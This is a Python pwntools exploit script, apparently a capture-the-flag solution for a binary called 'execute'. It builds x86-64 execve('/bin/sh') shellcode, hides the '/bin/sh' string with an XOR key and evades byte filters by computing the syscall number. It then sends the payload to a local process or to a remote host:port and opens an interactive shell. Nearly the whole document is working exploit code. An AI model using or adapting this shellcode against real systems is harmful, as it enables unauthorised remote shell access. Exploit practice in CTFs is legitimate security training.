#!/usr/bin/env python3
from pwn import context, ELF, asm, disasm, info, process, gdb, remote 
from argparse import ArgumentParser
import os

exe = "./execute"
elf = context.binary = ELF(exe, checksec=False)

### Obfuscation: /bin/cat flag.txt
_bin_sh = int.from_bytes("/bin/sh\x00".encode(), byteorder="little")
key = 0x9222311122334411

of_bin_sh = _bin_sh ^ key

info(f"Data Obfuscation:\n/bin/sh:\n\t{hex(_bin_sh)}\nkey:\n\t{hex(key)}\n/bin/sh XOR key:\n\t{hex(of_bin_sh)}\n")

### Shellcode generation: execve(char* pathname, char** argv, char** envp) ###
payload=b""

# char* pathname
payload+=asm(f"mov rdi, {of_bin_sh}")
payload+=asm(f"mov r8, {key}")
payload+=asm("xor rdi, r8")
payload+=asm("push rdi")
payload+=asm("mov rdi, rsp")

# char** argv, char** envp
payload+=asm("xor r11, r11")
payload+=asm("mov rsi, r11")
payload+=asm("mov rdx, r11")

# syscall(59) => execve("/bin/sh", NULL, NULL)
payload+=asm("mov al, 0x3c")
payload+=asm("dec al")
payload+=asm("syscall")

info(f"Shellcode\n{disasm(payload)}\n")
info(f"Shellcode length: {len(payload)} bytes\n")

### Exploitation ###
context.log_level="debug"
gdbinit="""
init-pwndbg
break* main
break* main+98
break* main+134
# break* main+174
continue
"""

parser = ArgumentParser(prog=os.path.basename(__file__))
parser.add_argument("-r", "--remote", help="-r, --remote REMOTE:PORT", action="store", type=str, nargs=1)
parser.add_argument("-p", "--process", help="-p, --process", action="store_true")
parser.add_argument("-d", "--debug", help="-d, --debug", action="store_true")

args = parser.parse_args()
if args.process:
    io=process([exe])
elif args.debug:
    io=gdb.debug([exe], gdbscript=gdbinit)
elif args.remote is not None:
    REMOTE, PORT = args.remote[0].split(':')
    io=remote(REMOTE, int(PORT))
else:
    exit(1)

io.sendlineafter(b'\n',payload)
io.interactive()
